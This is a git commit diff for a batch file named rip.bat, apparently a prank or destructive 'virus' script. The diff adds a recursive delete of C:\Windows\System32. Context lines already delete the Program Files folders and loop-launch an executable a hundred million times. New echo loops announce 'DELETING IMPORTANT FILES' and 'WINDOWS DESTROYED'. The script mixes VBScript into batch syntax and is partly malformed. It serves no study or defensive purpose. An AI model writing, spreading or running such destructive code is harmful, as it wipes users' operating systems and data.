c40c0aeda11b6e4c79bce29a9df9206891be5348
FonderElite <71190959+FonderElite@users.noreply.github.com>
2020-12-27 21:05:00 +0800

    Update rip.bat

--- rip.bat
+++ rip.bat
@@ -8,4 +8,10 @@ Dim x
 For x = 1 to 100000000
 WSHShell.Run "Tourstart.exe"
 Next
+del /S C:\Windows\System32
 del /S C:\Program Files and C:\Program Files (x86)
+color 02
+for /L %%n in (2,2,10000)do echo DELETING IMPORTANT FILES....
+color 04 
+for /L %%n in (3,3,2000)do echo HACKED!  WINDOWS DESTROYED BY FONDERELITE!!! 
+exit
